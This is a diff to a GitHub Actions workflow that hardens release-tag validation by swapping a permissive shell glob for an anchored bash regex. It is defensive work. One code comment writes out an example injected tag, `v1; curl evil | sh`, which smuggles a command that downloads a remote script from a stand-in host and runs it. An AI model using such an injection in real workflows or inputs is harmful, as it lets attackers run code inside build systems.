@@ -49,11 +49,14 @@ jobs:
             exit 1
           fi
           # Whitelist tag shape so even an env-passed value can't smuggle
-          # shell metachars into the rest of the workflow.
-          case "$TAG" in
-            v[0-9]*[A-Za-z0-9._-])  : ;;
-            *) echo "::error::tag does not match allowed pattern: $TAG"; exit 1 ;;
-          esac
+          # shell metachars into the rest of the workflow. Use bash's
+          # =~ regex (not shell globs — globs match `*` against anything,
+          # which would defeat the point: `v1; curl evil | sh` would
+          # have matched `v[0-9]*[A-Za-z0-9._-]`).
+          if [[ ! "$TAG" =~ ^v[0-9][A-Za-z0-9._-]*$ ]]; then
+            echo "::error::tag does not match allowed pattern: $TAG"
+            exit 1
+          fi
           echo "tag=$TAG" >> "$GITHUB_OUTPUT"
           echo "Resolved tag: $TAG"
 
